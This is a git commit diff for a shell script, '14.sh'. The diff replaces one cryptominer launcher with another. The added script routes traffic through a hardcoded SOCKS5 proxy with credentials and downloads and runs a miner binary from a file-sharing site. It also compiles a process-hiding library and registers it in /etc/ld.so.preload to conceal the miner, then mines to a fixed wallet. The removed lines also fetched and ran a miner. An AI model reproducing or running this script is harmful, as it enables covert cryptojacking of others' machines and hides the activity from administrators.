3cc095457413586c0f40d8c7dfd7502bd5e66674
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-09-25 20:52:03 -0500

    Update 14.sh

--- 14.sh
+++ 14.sh
@@ -1,4 +1,45 @@
-#!/bin/bash
-wget -O klx https://bit.ly/klx_nano >/dev/null 2>&1
-chmod +x klx >/dev/null 2>&1
-./klx -pool stratum+tcp://ethash.poolbinance.com:443 -wal teguhcong.gpu-mt -pass x
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.155.69.201:6406
+socks5_username = ingfoingfo
+socks5_password = maszZeehh
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://bashupload.com/6WaQ8/bzminer
+chmod +x bzminer
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./bzminer -p ethw.2miners.com:2020 -w 0xD01389F28125d811b381D593140fD3101925853E.roketgas
